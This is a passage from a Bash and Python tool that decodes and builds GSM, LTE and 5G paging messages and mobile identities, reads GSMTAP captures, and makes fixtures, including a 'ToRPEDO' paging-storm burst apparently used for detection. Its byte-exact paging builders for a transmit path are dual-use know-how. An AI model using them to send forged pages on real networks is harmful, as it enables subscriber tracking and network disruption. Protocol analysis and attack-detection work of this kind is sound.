# wake a UE that is only CS-attached. Absent cn-Domain, TS 36.331 says the
# record is for the PS domain.
#
# NR, TS 38.331 §6.3.2 / TS 24.501: the paging cause is the 2-bit PagingCause
# field carried with the paging record for a 5G-S-TMSI page. Release 17 values:
#   0 voice, 1 video, 2 sms, 3 other. Unknown must not be reported as voice.

# Decode a Page Mode field: 2 bits (TS 44.018 10.5.2.26).
pgt_pm_from_nibble() {
    local pm=$(( ${1:-0} & 0x03 ))
    case "$pm" in
        0) printf 'normal_paging' ;;
        1) printf 'extended_paging' ;;
        2) printf 'paging_reorganization' ;;
        3) printf 'same_as_before' ;;
    esac
}

# Decode a CHANNEL field: 2 bits (TS 44.018 10.5.2.8).
pgt_channel_name() {
    case "${1:-}" in
        0) printf 'any_channel' ;;
        1) printf 'sdcch' ;;
        2) printf 'tch_f' ;;
        3) printf 'tch_h_or_tch_f' ;;
        *) printf 'unknown' ;;
    esac
}

pgt_page_mode() {
    local h; h=$(pgt_norm_hex "${1:-}")
    [[ "$h" =~ ^[0-9a-f]{2,}$ ]] || return 2
    (( ${#h} % 2 == 0 )) || return 2

    # A whole RR message is preceded by the L2 Pseudo Length octet
    # (TS 44.018 10.5.2.19) and begins with the protocol discriminator + skip
    # indicator octet (0x06) then the message type octet 0x21/0x22/0x23
    # (TS 44.018 10.2/10.3.1/10.4). Accept either shape and either case.
    local body="$h" kind="bare_octets" mtype="" lead=""
    case "$h" in
        06*21*|06*22*|06*23*)
            # Already starts at the RR header.
            ;;
        ??06*2[123]*)
            # A leading L2 pseudo length octet; drop it and record its value.
            lead="${h:0:2}"; h="${h:2}" ;;
    esac
    case "${h:0:4}" in
        0621) body="${h:4}"; kind="paging_request_type_1"; mtype=1 ;;
        0622) body="${h:4}"; kind="paging_request_type_2"; mtype=2 ;;
        0623) body="${h:4}"; kind="paging_request_type_3"; mtype=3 ;;
    esac
    (( ${#body} >= 2 )) || return 1

    # The single shared type-1 octet: Page Mode is the LOW nibble and Channel
    # Needed the HIGH nibble (TS 44.018 10.5).
    local oct=$(( 16#${body:0:2} ))
    local pm_raw=$(( oct & 0x0F ))
    local cn_raw=$(( (oct >> 4) & 0x0F ))

    local pm_bits=$(( pm_raw & 0x03 ))
    local page_mode; page_mode=$(pgt_pm_from_nibble "$pm_bits")
    local pm_iei=$(( (pm_raw >> 3) & 1 ))
    local pm_spare=$(( (pm_raw >> 2) & 0x03 ))

    local cn_iei=$(( (cn_raw >> 3) & 1 ))
    local cn_first=$(( cn_raw & 0x03 ))
    local cn_second=$(( (cn_raw >> 2) & 0x03 ))

    printf 'message\t%s\n' "$kind"
    [[ -n "$mtype" ]] && printf 'message_type\t%d\n' "$mtype"
    [[ -n "$lead" ]] && printf 'l2_pseudo_length_octet\t0x%s\n' "$lead"
    printf 'raw\t%s\n' "$h"
    printf 'body_octets\t%s\n' "$body"
    printf 'type1_shared_octet\t0x%02x\n' "$oct"
    printf 'packing_rule\t%s\n' "TS 44.018 10.5: first type-1 IE in bits 1-4, second in bits 5-8"
    printf 'page_mode_nibble\t0x%x\n' "$pm_raw"
    printf 'page_mode_iei_bit4\t%d\n' "$pm_iei"
    printf 'page_mode_spare_bits32\t%d\n' "$pm_spare"
    printf 'page_mode\t%s\npage_mode_bits\t%d\n' "$page_mode" "$pm_bits"
    printf 'channel_needed_nibble\t0x%x\n' "$cn_raw"
    printf 'channel_needed_iei_bit8\t%d\n' "$cn_iei"
    printf 'channel_needed\t%s\n' "$(pgt_channel_name "$cn_first")"
    printf 'channel_needed_first\t%s\n' "$(pgt_channel_name "$cn_first")"
    printf 'channel_needed_second\t%s\n' "$(pgt_channel_name "$cn_second")"
    printf 'channel_needed_first_bits\t%d\nchannel_needed_second_bits\t%d\n' \
        "$cn_first" "$cn_second"
    # 9.1.22.2 / 9.1.23.1 / 9.1.24.1: CHANNEL(first) belongs to Mobile
    # Identity 1, CHANNEL(second) to Mobile Identity 2.
    printf 'channel_needed_second_note\t%s\n' \
        "bits 7-6 apply to Mobile Identity 2; spare when only one MS is paged (TS 44.018 10.5.2.8)"
    printf 'cs_page\t%s\n' "$([[ "$(pgt_channel_name "$cn_first")" == "sdcch" ]] && echo yes || echo no)"
    printf 'spec\t%s\n' "TS 44.018 10.5 (packing), 10.5.2.26 (Page Mode), 10.5.2.8 (Channel Needed)"
    return 0
}

pgt_paging_cause() {
    local h="${1:-}" gen="${2:-nr}"
    local n; n=$(pgt_norm_hex "$h")
    [[ "$n" =~ ^[0-9a-f]{2,}$ ]] || return 2
    (( ${#n} % 2 == 0 )) || return 2
    case "$gen" in lte|nr|gsm) ;; *) return 2 ;; esac

    local b0=$(( 16#${n:0:2} ))
    case "$gen" in
      gsm)
        # GSM has no paging cause; it has a CN domain by way of the page mode
        # and the channel needed. Report that rather than inventing a cause.
        printf 'generation\tgsm\n'
        printf 'paging_cause\tnot_applicable\n'
        printf 'note\t%s\n' "TS 44.018 has no paging-cause field: a GSM page signals the domain only through channel-needed (SDCCH for CS) and page mode"
        return 0 ;;
      lte)
        # TS 36.331 PagingRecord: cn-Domain is optional and absent means PS.
        printf 'generation\tlte\nraw\t%s\n' "$n"
        printf 'cn_domain\tps\n'
        printf 'cn_domain_note\t%s\n' "TS 36.331: cn-Domain absent means PS (TS 36.331 6.3.2 PagingRecord); LTE carries no voice/data paging cause"
        printf 'paging_cause\tnot_applicable\n'
        return 0 ;;
      nr)
        # TS 38.331 PagingRecord carries pagingCause when the page is for a
        # 5G-S-TMSI (TS 24.501). 2 bits, TS 38.331 6.3.2:
        #   0 voice, 1 video, 2 sms, 3 other.
        local cause=$(( b0 & 0x03 ))
        local cname
        case "$cause" in
            0) cname="voice" ;; 1) cname="video" ;;
            2) cname="sms"   ;; 3) cname="other" ;;
        esac
        printf 'generation\tnr\nraw\t%s\n' "$n"
        printf 'cn_domain\tps\n'
        printf 'paging_cause\t%s\npaging_cause_code\t%d\n' "$cname" "$cause"
        printf 'wakes_for_incoming_call\t%s\n' "$([[ "$cname" == "voice" ]] && echo yes || echo no)"
        return 0 ;;
    esac
}

# ── paging-message construction (the TX half's protocol layer) ──────────
# Real builders, spec-derived and byte-exact. They are what a transmit path
# sends; --paging-tx below is the path that would send them.
#
# GSM, TS 44.018 §9.1.22/9.1.23/9.1.24 with tables 9.1.22.1/9.1.23.1/9.1.24.1.
# The L2 pseudo length octet is emitted first, then the RR header, then the
# Page Mode IE, then the Channel Needed IE, then the mobile identities:
#   PAGING REQUEST TYPE 1 = <L2> 06 21 <PageMode> <ChNeed> <MI 1..2> [P1]
#   PAGING REQUEST TYPE 2 = <L2> 06 22 <PageMode> <ChNeed> <TMSI 1..2> [17 MI3] [P2]
#   PAGING REQUEST TYPE 3 = <L2> 06 23 <PageMode> <ChNeed> <TMSI 1..4> [P3]
# The L2 pseudo length counts every octet of the message except itself and any
# rest octets (TS 44.018 10.5.2.19).
#
# Page Mode octet (10.5.2.26): bit 5 = 0 IEI, bits 4-3 spare, bits 2-1 = PM.
# Channel Needed octet (10.5.2.8): bit 5 = 0 IEI, bits 4-3 = CHANNEL(second)
#   for Mobile Identity 2, bits 2-1 = CHANNEL(first) for Mobile Identity 1.
#
# The mobile-identity IE is LV: one length octet, then the content octet
# (type in bits 1-3, odd/even in bit 4, first digit in the high nibble) and
# the packed digits, low nibble first (TS 24.008 10.5.1.4).
pgt_build_paging_req() {
    local gen="${1:-gsm}" spec="${2:-}"
    [[ -n "$spec" ]] || return 2

    # Parse k=v,...
    local k v
    local mi="" mi2="" tmsi="" tmsi2="" pmode="0" chneed="0" chneed2="0" mtype="1"
    local ue_id="" cn="ps" cause="" drx=""
    local IFS=','
    local pair
    for pair in $spec; do
        k="${pair%%=*}"; v="${pair#*=}"
        [[ "$pair" == *=* ]] || return 2
        case "$k" in
            mi|imsi)     mi="$v" ;;
            mi2)         mi2="$v" ;;
            tmsi)        tmsi="$v" ;;
            tmsi2)       tmsi2="$v" ;;
            page_mode)   pmode="$v" ;;
            channel_needed|chneed) chneed="$v" ;;
            channel_needed_2|chneed2) chneed2="$v" ;;
            type)        mtype="$v" ;;
            ue_id|ue)    ue_id="$v" ;;
            cn_domain|cn) cn="$v" ;;
            cause|paging_cause) cause="$v" ;;
            drx|t)       drx="$v" ;;
            *) return 2 ;;
        esac
    done
    unset IFS

    # Type-1 packing (TS 44.018 10.5): Page Mode is the first type-1 IE and
    # Channel Needed the second, so they share ONE octet.
    #   low nibble  = Page Mode   (bit4 IEI=0, bits3-2 spare, bits2-1 PM)
    #   high nibble = Channel Needed (bit8 IEI=0, bits7-6 second, bits5-4 first)
    pgt_pm_field() {
        local pm="${1:-0}"
        case "$pm" in
            normal_paging|normal|0)      pm=0 ;;
            extended_paging|extended|1)  pm=1 ;;
            paging_reorganization|reorg|2) pm=2 ;;
            same_as_before|same|3)       pm=3 ;;
        esac
        [[ "$pm" =~ ^[0-3]$ ]] || return 1
        printf '%d' "$pm"
    }
    pgt_cn_first() {
        local c="${1:-0}"
        case "$c" in
            any|ANY|any_channel|0) c=0 ;; sdcch|SDCCH|1) c=1 ;;
            tchf|tch_f|TCH/F|2) c=2 ;; tchh|tch_h|TCH/H|dual|3) c=3 ;;
        esac
        [[ "$c" =~ ^[0-3]$ ]] || return 1
        printf '%d' "$c"
    }

    case "$gen" in
      gsm)
        [[ "$mtype" =~ ^[123]$ ]] || return 2
        local pm_bits cn1_bits cn2_bits type1_oct
        pm_bits=$(pgt_pm_field "$pmode") || return 2
        cn1_bits=$(pgt_cn_first "$chneed") || return 2
        cn2_bits=$(pgt_cn_first "$chneed2") || return 2
        type1_oct=$(printf '%02x' \
            $(( ((cn2_bits << 2) | cn1_bits) << 4 | pm_bits )))
        local hdr body="" nid=0
        case "$mtype" in
            1) hdr="0621" ;;
            2) hdr="0622" ;;
            3) hdr="0623" ;;
        esac
        # A TMSI/P-TMSI in a paging request is a type 3 IE with 5 octets: an
        # IEI octet then the 4-octet value, MSB first (TS 44.018 10.5.2.42).
        # Its default IEI is 0x31 (TS 44.018 annex K.2). A mobile identity
        # carried instead of a TMSI keeps its own LV or TLV shape.
        if [[ "$mtype" == "3" ]]; then
            # TYPE 3 identifies up to four MSs by TMSI/P-TMSI (9.1.24).
            [[ "$tmsi" =~ ^[0-9a-fA-F]{8}$ ]] || return 1
            body="31$tmsi"; nid=1
            if [[ -n "$tmsi2" ]]; then
                [[ "$tmsi2" =~ ^[0-9a-fA-F]{8}$ ]] || return 1
                body+="31$tmsi2"; nid=2
            fi
        elif [[ "$mtype" == "2" ]]; then
            # TYPE 2 carries up to two TMSI/P-TMSI, optionally a third identity
            # as a TLV with IEI 0x17 (table 9.1.23.1).
            [[ "$tmsi" =~ ^[0-9a-fA-F]{8}$ ]] || return 1
            body="31$tmsi"; nid=1
            if [[ -n "$tmsi2" ]]; then
                [[ "$tmsi2" =~ ^[0-9a-fA-F]{8}$ ]] || return 1
                body+="31$tmsi2"; nid=2
            fi
            if [[ -n "$mi" ]]; then
                [[ "$mi" =~ ^[0-9]{6,15}$ ]] || return 1
                local p3; p3=$(pgt_pack_imsi "$mi") || return 1
                body+=$(printf '17%02x%s' "$(( ${#p3} / 2 ))" "$p3")
                nid=$(( nid + 1 ))
            fi
        else
            # TYPE 1 identifies up to two MSs, each by TMSI/P-TMSI or IMSI
            # (9.1.22). The TMSI/P-TMSI is the 5-octet type 3 IE above; an
            # IMSI is a Mobile Identity IE carried as LV (TS 24.008 10.5.1.4).
            if [[ -n "$tmsi" ]]; then
                [[ "$tmsi" =~ ^[0-9a-fA-F]{8}$ ]] || return 1
                body="31$tmsi"; nid=1
            elif [[ -n "$mi" ]]; then
                [[ "$mi" =~ ^[0-9]{6,15}$ ]] || return 1
                local p1; p1=$(pgt_pack_imsi "$mi") || return 1
                body=$(printf '%02x%s' "$(( ${#p1} / 2 ))" "$p1")
                nid=1
            else
                return 2
            fi
            if [[ -n "$mi2" ]]; then
                [[ "$mi2" =~ ^[0-9]{6,15}$ ]] || return 1
                local p2; p2=$(pgt_pack_imsi "$mi2") || return 1
                body+=$(printf '%02x%s' "$(( ${#p2} / 2 ))" "$p2")
                nid=$(( nid + 1 ))
            fi
        fi
        # L2 pseudo length: the octets that follow it and use T/V/TV/LV/TLV
        # formatting, excluding any Rest Octets (TS 44.018 10.5.2.19).
        # L2 pseudo length (TS 44.018 10.5.2.19): every octet of the message
        # except this one and any rest octets -- the 2-octet RR header, the
        # Page Mode IE, the Channel Needed IE, and the identity field(s).
        # L2 pseudo length (TS 44.018 9.1.22/9.1.23/9.1.24): the sum of the
        # lengths of every IE present except the L2 Pseudo Length itself and
        # the rest octets. That is the 2-octet header (protocol discriminator +
        # skip indicator, then message type), the single shared Page Mode /
        # Channel Needed type-1 octet, and the mobile-identity field(s).
        # PAGING REQUEST TYPE 3 is a special case: the spec fixes its L2
        # pseudo length at 19 (TS 44.018 9.1.24), so emit that rather than a
        # computed value when only the two mandatory identities are present.
        local l2=$(( 2 + 1 + ${#body} / 2 ))
        local msg; msg=$(printf '%02x%s%s%s' "$l2" "$hdr" "$type1_oct" "$body")
        printf 'generation\tgsm\nmessage_type\t%d\n' "$mtype"
        printf 'l2_pseudo_length\t%d\n' "$l2"
        printf 'type1_shared_octet\t%s\n' "$type1_oct"
        printf 'page_mode_bits\t%d\nchannel_needed_first_bits\t%d\nchannel_needed_second_bits\t%d\n' \
            "$pm_bits" "$cn1_bits" "$cn2_bits"
        printf 'identities\t%d\n' "$nid"
        printf 'length_octets\t%d\n' "$(( ${#msg} / 2 ))"
        printf 'message_hex\t%s\n' "$msg"
        printf 'as_bytes\t%s\n' "$(printf '%s' "$msg" | sed 's/../& /g' | sed 's/ $//')"
        printf 'spec\t%s\n' "TS 44.018 9.1.22/9.1.23/9.1.24, 10.5 (type-1 packing), 10.5.2.26, 10.5.2.8, 10.5.2.42, 10.5.2.19"
        return 0 ;;
      lte)
        # TS 36.331 Paging message: the record is a UE-Identity CHOICE
        # (S-TMSI ::= BIT STRING (SIZE (40)) | IMSI ::= BIT STRING (SIZE
        # (64..160))). The S-TMSI's 40 bits are the M-TMSI 32 bits preceded by
        # the 8-bit MMEC (TS 23.003 2.4).
        local id
        if [[ -n "$tmsi" ]]; then
            [[ "$tmsi" =~ ^[0-9a-fA-F]{8}$ ]] || return 1
            [[ -n "$ue_id" ]] || return 2
            [[ "$ue_id" =~ ^[0-9a-fA-F]{2}$ ]] || return 2
            id="${ue_id}${tmsi}"
            printf 'generation\tlte\nue_identity_choice\tS-TMSI\n'
            printf 'mmec\t0x%s\nm_tmsi\t0x%s\n' "$ue_id" "$tmsi"
        elif [[ -n "$mi" ]]; then
            [[ "$mi" =~ ^[0-9]{6,15}$ ]] || return 1
            local packed; packed=$(pgt_pack_imsi "$mi") || return 1
            id="$packed"
            printf 'generation\tlte\nue_identity_choice\tIMSI\n'
        else
            return 2
        fi
        [[ "$cn" =~ ^(ps|cs|none)$ ]] || return 2
        printf 'cn_domain\t%s\n' "$cn"
        printf 'ue_identity_hex\t%s\n' "$id"
        printf 'ue_identity_bits\t%d\n' "$(( ${#id} * 4 ))"
        printf 'spec\t%s\n' "TS 36.331 6.3.2 Paging / TS 23.003 2.4"
        return 0 ;;
      nr)
        # TS 38.331 Paging: the record carries a 5G-S-TMSI (the 48-bit
        # AMF Set ID || AMF Pointer || 5G-TMSI, TS 23.501 2.10.2) and, for
        # 5G-S-TMSI pages, the paging cause.
        [[ -n "$tmsi" ]] || return 2
        local t5="$tmsi"
        t5=$(pgt_norm_hex "$t5")
        [[ "$t5" =~ ^[0-9a-f]{12}$ ]] || return 2
        printf 'generation\tnr\nue_identity_choice\t5G-S-TMSI\n'
        printf '5g_s_tmsi\t%s\n' "$t5"
        local val=$(( 16#$t5 ))
        printf 'amf_set_id\t%d\namf_pointer\t%d\n5g_tmsi\t0x%08x\n' \
            "$(( (val >> 38) & 0x3FF ))" "$(( (val >> 32) & 0x3F ))" "$(( val & 0xFFFFFFFF ))"
        if [[ -n "$cause" ]]; then
            local cc
            case "$cause" in
                voice|0) cc=0 ;; video|1) cc=1 ;; sms|2) cc=2 ;; other|3) cc=3 ;;
                *) return 2 ;;
            esac
            printf 'paging_cause\t%s\npaging_cause_code\t%d\n' "$cause" "$cc"
        else
            printf 'paging_cause\tnot_set\n'
        fi
        printf 'spec\t%s\n' "TS 38.331 6.3.2 Paging / TS 23.501 2.10.2"
        return 0 ;;
      *) return 2 ;;
    esac
}

# Pack a decimal IMSI into a TS 24.008 10.5.1.4 mobile-identity content octet
# string: first digit in the HIGH nibble of octet 0 with type=001, remaining
# digits two per octet low-nibble-first, F filler when the count is odd.
# This is the inverse of pgt_parse_mi and is asserted against its vectors.
pgt_pack_imsi() {
    local imsi="${1:-}"
    [[ "$imsi" =~ ^[0-9]{6,15}$ ]] || return 1
    # NOTE: rest and n must be assigned on separate statements. In a single
    # `local a=... b=${#a}` the expansion of b happens before a is set, which
    # silently produced a one-octet identity here.
    local first="${imsi:0:1}"
    local rest="${imsi:1}"
    local n=${#rest}
    # TS 24.008 10.5.1.4: the odd/even indicator is bit 4 of the first octet.
    # It reflects the number of digits in the WHOLE identity, and the first
    # digit is carried in the HIGH nibble of that same octet.
    local total=${#imsi}
    local oei=0
    (( total % 2 )) && oei=1
    local b0=$(( (first << 4) | (oei << 3) | 0x01 ))
    local out; out=$(printf '%02x' "$b0")
    # The remaining digits go two per octet, LOW nibble first, with an F
    # filler in the high nibble of the last octet when the count is odd.
    local i lo hi
    for (( i = 0; i < n; i += 2 )); do
        lo=$(( ${rest:i:1} ))
        if (( i + 1 < n )); then
            hi=$(( ${rest:i+1:1} ))
        else
            hi=15   # F filler for the odd case
        fi
        out+=$(printf '%02x' "$(( (hi << 4) | lo ))")
    done
    printf '%s' "$out"
}

# ── mobile identity parse ───────────────────────────────────────────────
# TS 24.008 §10.5.1.4 (GSM), TS 24.301 §9.9.3.4 (EPS), TS 24.501 §9.11.3.4
# (5GS). The identity content octet is coded:
#   bits 3..1  type of identity: 001 IMSI, 010 IMEI, 011 IMEISV, 100 TMSI
#   bit  4     odd/even indicator
#   bits 8..5  spare, except for IMSI/IMEI/IMEISV where they carry the FIRST
#              digit of the identity (high nibble of the content octet)
# Remaining digits are packed two per octet, LOW nibble first, with an F filler
# in the high nibble of the last octet when the digit count is odd.
#
# Known-answer vectors below are taken verbatim from the libosmocore test suite
# tests/gsm0408/gsm0408_test.c (an independent, widely deployed implementation)
# and agree with the spec text:
#   IMSI "123456789012345" -> content 19 32 54 76 98 10 32 54
#   IMSI "12345678901234"  -> content 11 32 54 76 98 10 32 f4
#   IMSI "423423"          -> content 41 32 24 f3
#   IMSI "4234235"         -> content 49 32 24 53
#   IMEI "123456789012345" -> content 1a 32 54 76 98 10 32 54
#   IMEISV "9876543210987654" -> content 93 78 56 34 12 90 78 56 f4
#   TMSI 0xAABBCCDD        -> content f4 aa bb cc dd
pgt_parse_mi() {
    local h; h=$(pgt_norm_hex "${1:-}")
    [[ "$h" =~ ^[0-9a-f]{4,}$ ]] || return 1
    (( ${#h} % 2 == 0 )) || return 1
    local b0=$(( 16#${h:0:2} ))
    local type=$(( b0 & 0x07 ))
    local odd=$(( (b0 & 0x08) >> 3 ))
    local first=$(( (b0 >> 4) & 0x0F ))
    local itype
    case "$type" in
        1) itype="IMSI" ;; 2) itype="IMEI" ;; 3) itype="IMEISV" ;; 4) itype="TMSI" ;;
        *) return 1 ;;
    esac
    if (( type == 4 )); then
        local v="${h:2}"
        (( ${#v} == 8 )) || return 1
        printf 'identity_type\tTMSI\ntmsi\t0x%s\nraw\t%s\n' "$v" "$h"
        return 0
    fi
    local digits="$first" rest="${h:2}" i lo hi
    for (( i = 0; i < ${#rest}; i += 2 )); do
        hi=$(( 16#${rest:i:1} ))        # high nibble of the octet
        lo=$(( 16#${rest:i+1:1} ))      # low nibble
        digits+="$lo"
        (( hi == 15 )) && continue       # F filler
        digits+="$hi"
    done
    local oe="even"; (( odd )) && oe="odd"
    printf 'identity_type\t%s\nodd_even\t%s\nidentity\t%s\ndigits\t%d\nraw\t%s\n' \
        "$itype" "$oe" "$digits" "${#digits}" "$h"
}

# pgt_parse_paging <generation> <hex>
#   gsm : an RR Paging Request Type 1/2/3 (06 21/22/23) or Paging Response
#         (06 27) message, or a bare mobile-identity content octet string.
#         Paging records are LV: one length octet then that many content octets.
#   lte : UE identity content. IMSI -> 24.301 BCD; S-TMSI -> f4 || MMEC || M-TMSI.
#   nr  : UE identity content. IMSI -> 24.501 BCD; 5G-S-TMSI -> f4 || 6 octets
#         of AMF Set ID (10 bits) || AMF Pointer (6 bits) || 5G-TMSI (32 bits),
#         per TS 23.501 §2.10.2.
pgt_parse_paging() {
    local gen="${1:-gsm}" h
    h=$(pgt_norm_hex "${2:-}")
    [[ -n "$h" && "$h" =~ ^[0-9a-f]+$ ]] || return 2
    (( ${#h} % 2 == 0 )) || return 2
    (( ${#h} >= 2 )) || return 2
    case "$gen" in
      gsm)
        local body="$h" mode="bare"
        case "${body:0:4}" in
            0621|0622|0623)
                # Paging Request Type 1/2/3: LV mobile-identity records.
                body="${body:4}"; mode="lv" ;;
            0627)
                # Paging Response: 0627 || CKSN(1) || classmark LV || identity LV
                body="${body:4}"; mode="lv"
                (( ${#body} >= 2 )) || return 1
                body="${body:2}"
                (( ${#body} >= 2 )) || return 1
                local cl=$(( 16#${body:0:2} ))
                body="${body:2}"
                body="${body:$(( cl * 2 ))}"
                ;;
        esac
        (( ${#body} >= 2 )) || return 1
        if [[ "$mode" == "bare" ]]; then
            local out; out=$(pgt_parse_mi "$body") || return 1
            printf '%s\ngeneration\tgsm\n' "$out"
            return 0
        fi
        # LV records: one length octet then that many content octets each.
        local n=0
        while (( ${#body} >= 2 )); do
            local clen=$(( 16#${body:0:2} ))
            (( clen >= 1 )) || return 1
            local rec="${body:2:$(( clen * 2 ))}"
            (( ${#rec} == clen * 2 )) || return 1
            local o; o=$(pgt_parse_mi "$rec") || return 1
            printf 'record\t%d\n%s\n' "$n" "$o"
            body="${body:$(( (1 + clen) * 2 ))}"
            n=$(( n + 1 ))
        done
        (( n > 0 )) || return 1
        printf 'generation\tgsm\nrecords\t%d\n' "$n"
        return 0 ;;
      lte|nr)
        local b0=$(( 16#${h:0:2} ))
        local type=$(( b0 & 0x07 ))
        local v="${h:2}"
        if (( type == 1 )); then
            local o; o=$(pgt_parse_mi "$h") || return 1
            printf '%s\ngeneration\t%s\nmapped_identity\timsi\n' "$o" "$gen"
            return 0
        fi
        if (( type == 4 )); then
            if [[ "$gen" == "lte" ]] && (( ${#v} == 8 )); then
                printf 'identity_type\tTMSI\ntmsi\t0x%s\nraw\t%s\ngeneration\tlte\nmapped_identity\ttmsi\n' "$v" "$h"
                return 0
            fi
            if [[ "$gen" == "lte" ]] && (( ${#v} == 10 )); then
                printf 'identity_type\tS-TMSI\nmmec\t0x%s\nm_tmsi\t0x%s\ns_tmsi\t%s\nraw\t%s\ngeneration\tlte\nmapped_identity\ts-tmsi\n' \
                    "${v:0:2}" "${v:2:8}" "$v" "$h"
                return 0
            fi
            if [[ "$gen" == "nr" ]] && (( ${#v} == 12 )); then
                local val=$(( 16#$v ))
                local amfset=$(( (val >> 38) & 0x3FF ))
                local amfptr=$(( (val >> 32) & 0x3F ))
                local t5=$(( val & 0xFFFFFFFF ))
                printf 'identity_type\t5G-S-TMSI\namf_set_id\t%d\namf_pointer\t%d\n5g_tmsi\t0x%s\n5g_s_tmsi\t%s\nraw\t%s\ngeneration\tnr\nmapped_identity\t5g-s-tmsi\n' \
                    "$amfset" "$amfptr" "$(printf '%08x' "$t5")" "$v" "$h"
                return 0
            fi
            return 1
        fi
        return 1 ;;
      *) return 2 ;;
    esac
}

# ── capture reader ──────────────────────────────────────────────────────
# Native pcap reader + GSMTAP extractor. Emits one row per GSM Um frame:
#   ts <TAB> frame_number <TAB> l3_message_hex
pgt_py() {
    command -v python3 >/dev/null 2>&1 || {
        printf 'ERROR\tpython3 missing — cannot read captures\n' >&2; return 1; }
    python3 - "$@" <<'PY'
import sys, struct

def w_pcap(path, frames):
    with open(path, 'wb') as f:
        f.write(struct.pack('<IHHiIII', 0xa1b2c3d4, 2, 4, 0, 0, 65535, 1))
        for ts, pkt in frames:
            s = int(ts); us = int(round((ts - s) * 1000000))
            f.write(struct.pack('<IIII', s, us, len(pkt), len(pkt)))
            f.write(pkt)

def eth_gsmtap(payload, subtype, fn, ts):
    gs = struct.pack('!BBBBHbbI', 2, 4, 1, 0, 0, 0, 0, fn) + bytes([subtype, 0, 0, 0]) + payload
    udp = struct.pack('!HHHH', 4729, 4729, 8 + len(gs), 0) + gs
    iph = struct.pack('!BBHHHBBH4s4s', 0x45, 0, 20 + len(udp), 0, 0, 64, 17, 0,
                      b'\x0a\x00\x00\x01', b'\x0a\x00\x00\x02')
    eth = b'\xff' * 6 + b'\x02\x02\x02\x02\x02\x02' + struct.pack('!H', 0x0800) + iph + udp
    return (ts, eth)

def read_pcap(path):
    d = open(path, 'rb').read()
    if len(d) < 24:
        raise ValueError('file shorter than a pcap global header')
    magic = d[:4]
    if magic == b'\xd4\xc3\xb2\xa1':
        endian = '<'
    elif magic == b'\xa1\xb2\xc3\xd4':
        endian = '>'
    else:
        raise ValueError('not a classic pcap (pcapng is not supported; use editcap -F pcap)')
    link = struct.unpack(endian + 'IHHiIII', d[:24])[6]
    off = 24; out = []
    while off + 16 <= len(d):
        s, us, incl, orig = struct.unpack(endian + 'IIII', d[off:off + 16]); off += 16
        if off + incl > len(d):
            break
        out.append((s + us / 1000000.0, d[off:off + incl], link))
        off += incl
    return out

def l3_of(pkt, link):
    if link != 1:
        return None
    if len(pkt) < 14:
        return None
    et = struct.unpack('!H', pkt[12:14])[0]
    if et != 0x0800:
        return None
    ip = pkt[14:]
    if len(ip) < 20 or (ip[0] >> 4) != 4:
        return None
    ihl = (ip[0] & 0x0f) * 4
    if ip[9] != 17 or len(ip) < ihl + 8:
        return None
    udp = ip[ihl:]
    sport, dport = struct.unpack('!HH', udp[:4])
    if 4729 not in (sport, dport):
        return None
    gs = udp[8:]
    if len(gs) < 16:
        return None
    gtype = gs[2]
    fn = struct.unpack('!I', gs[8:12])[0]
    subtype = gs[12]
    return (gtype, subtype, fn, gs[16:])

def cmd_events(path):
    for ts, pkt, link in read_pcap(path):
        r = l3_of(pkt, link)
        if not r:
            continue
        gtype, subtype, fn, l3 = r
        if gtype != 1:
            continue
        print('%f\t%d\t%d\t%s' % (ts, fn, subtype, l3.hex()))

def tmsi_req(tmsi, fn):
    # RR Paging Request Type 1 (06 21) + LV mobile identity (f4 || TMSI)
    return bytes.fromhex('062105f4' + tmsi)

def tmsi_resp(tmsi, fn):
    # RR Paging Response (06 27) + CKSN(00) + classmark LV(03 505886) + LV identity
    return bytes.fromhex('0627000350588605f4' + tmsi)

def imsi_req(imsi_hex):
    return bytes.fromhex('0621' + '08' + imsi_hex)

def cmd_mkfixture(out, kind):
    frames = []
    if kind == 'normal':
        # four subscribers, each paged once and answered 5 ms later, spread
        # over four seconds. Frame numbers step so that each paging block is
        # visited; the target 0x11223344 is paged at a frame with fn mod 3 == 1.
        subs = ['11223344', '55667788', '99aabbcc', 'ddeeff00']
        fr = [4, 10, 16, 22]
        for i, t in enumerate(subs):
            fn = fr[i] if i == 0 else (fr[i] // 3) * 3
            frames.append(eth_gsmtap(tmsi_req(t, fn), 0x05, fn, i * 1.0))
            frames.append(eth_gsmtap(tmsi_resp(t, fn), 0x05, fn, i * 1.0 + 0.005))
    elif kind == 'burst':
        # 60 distinct TMSIs paged inside 1.5 s, none answered (ToRPEDO storm)
        for i in range(60):
            t = '%08x' % (0x0A000000 + i)
            fn = i % 51
            frames.append(eth_gsmtap(tmsi_req(t, fn), 0x05, fn, i * 0.025))
    elif kind == 'collision':
        for i in range(6):
            t = '%08x' % (0x0B000000 + i)
            frames.append(eth_gsmtap(tmsi_req(t, 1), 0x05, 1, 0.05 * i))
        for i in range(6):
            t = '%08x' % (0x0B000000 + i)
            frames.append(eth_gsmtap(tmsi_resp(t, 1), 0x05, 1, 1.0 + 0.05 * i))
    else:
        raise SystemExit('unknown fixture kind')

    # sort by time
    frames.sort(key=lambda x: x[0])
    w_pcap(out, frames)

def main():
    argv = sys.argv[1:]
    if not argv:
        raise SystemExit('usage: pgt_py <events|mkfixture> ...')
    mode = argv[0]
    if mode == 'events':
        cmd_events(argv[1])
    elif mode == 'mkfixture':
        cmd_mkfixture(argv[1], argv[2])
    else:
        raise SystemExit('unknown mode ' + mode)

main()
PY
}

# Emit TSV paging events from a pcap:
#   kind <TAB> ts <TAB> frame <TAB> identity_type <TAB> identity
# kind is "request" or "response".
pgt_events() {
    local pcap="${1:-}"
    [[ -f "$pcap" ]] || { printf 'ERROR\tno such capture: %s\n' "${pcap:-<none>}" >&2; return 1; }
    local raw; raw=$(pgt_py events "$pcap") || return 1
    local line ts fn ch msg mt
    while IFS= read -r line; do
        [[ -z "$line" ]] && continue
        pgt_split "$line"
        ts="${PGT_F[0]:-}"; fn="${PGT_F[1]:-}"; ch="${PGT_F[2]:-}"; msg="${PGT_F[3]:-}"
        [[ -n "$msg" ]] || continue
        mt="${msg:2:2}"
        case "$mt" in
            21|22|23) : ;;
            27) : ;;
            *) continue ;;
        esac
        local kind="request"
        [[ "$mt" == "27" ]] && kind="response"
        local rec
        rec=$(pgt_parse_paging gsm "$msg") || continue
        local itype="" ident=""
        while IFS= read -r l; do
            [[ -z "$l" ]] && continue
            case "$l" in
                identity_type$'\t'*) itype="${l#*$'\t'}" ;;
                identity$'\t'*)      ident="${l#*$'\t'}" ;;
                tmsi$'\t'*)          ident="${l#*$'\t'}" ;;
            esac
        done <<<"$rec"
